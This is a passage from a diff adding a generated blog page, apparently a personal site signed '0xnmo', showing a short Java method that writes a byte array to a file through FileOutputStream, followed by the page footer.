+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">writeBytes</span><span class="p">(</span><span class="n">File</span><span class="w"> </span><span class="n">file</span><span class="p">,</span><span class="w"> </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">FileOutputStream</span><span class="w"> </span><span class="n">fos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="n">file</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">fos</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="n">data</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">fos</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    <footer class="footer">
+    <span>&copy; 2026 Neilmark Ochea / 0xnmo</span>
+</footer></body>
+
+</html>
